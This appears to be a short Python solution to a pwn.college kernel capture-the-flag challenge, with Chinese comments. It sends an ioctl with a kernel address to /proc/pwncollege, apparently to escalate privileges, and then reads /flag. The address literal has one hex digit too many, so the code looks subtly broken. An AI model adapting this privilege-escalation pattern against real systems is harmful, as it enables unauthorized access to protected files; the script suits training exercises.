import ctypes
from ctypes import c_ulong
import os 
# 假设设备文件已经以只读方式打开
fd = os.open("/proc/pwncollege", 0)

# 假设 ioctl 命令码和参数
cmd = 1337  # 替换为实际的 ioctl 命令码
arg = c_ulong(0xfffffffffc0000d22)  # 替换为实际的 unsigned long 参数

# 调用 ioctl
ret = ctypes.CDLL(None).ioctl(fd, cmd, arg)

os.close(fd)
fd1 = os.open("/flag", 0)
os.sendfile(1, fd1, 0, 0x40)